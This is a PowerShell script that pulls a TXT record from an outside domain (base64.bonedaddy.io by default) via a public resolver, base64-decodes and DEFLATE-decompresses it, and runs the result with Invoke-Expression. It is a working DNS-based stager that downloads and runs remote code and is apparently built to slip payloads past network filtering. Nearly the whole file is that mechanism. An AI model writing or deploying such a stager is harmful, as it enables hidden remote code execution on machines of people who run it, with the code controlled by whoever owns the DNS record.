# queries the given host_name for a TXT record expecting the value to be a base64 encoded DEFLATE compressed string
# base64 decoding was taken from # encoding from https://gist.github.com/vortexau/13de5b6f9e46cf419f1540753c573206

param (
    [string]$host_name = "base64.bonedaddy.io",
    [string]$dns_server = "8.8.8.8"
)

$dns_result = Resolve-DnsName -Name $host_name -Type TXT -Server $dns_server | Select-Object Strings
$base64_output = ''
$deconstructed_query = ''

# reconstruct the output
for ($i=0; $i -lt $dns_result.Strings.length; $i++) {
    $base64_output += $dns_result.Strings[$i]
}

# uncomment to debug
# Write-Host $base64_output

$data = [System.Convert]::FromBase64String($base64_output)
$ms = New-Object System.IO.MemoryStream
$ms.Write($data, 0, $data.Length)
$ms.Seek(0,0) | Out-Null
$sr = New-Object System.IO.StreamReader(New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress))
while ($line = $sr.ReadLine()) {  
    $deconstructed_query += $line
}

Invoke-Expression ($deconstructed_query)